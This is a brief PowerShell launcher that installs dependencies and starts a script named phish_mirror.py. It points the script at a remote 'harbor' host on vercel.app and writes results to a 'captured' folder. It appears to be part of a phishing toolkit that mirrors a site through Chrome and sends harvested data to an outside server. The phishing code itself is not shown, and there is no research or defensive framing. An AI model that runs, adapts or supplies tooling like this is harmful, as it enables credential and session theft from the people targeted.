Set-Location $PSScriptRoot
$harbor = if ($env:HARBOR_URL) { $env:HARBOR_URL } else { "https://harbor-ten-lake.vercel.app" }
python -m pip install -r requirements.txt -q
Write-Host "Mirror -> $harbor" -ForegroundColor Cyan
python phish_mirror.py --channel chrome --harbor $harbor --out captured @args
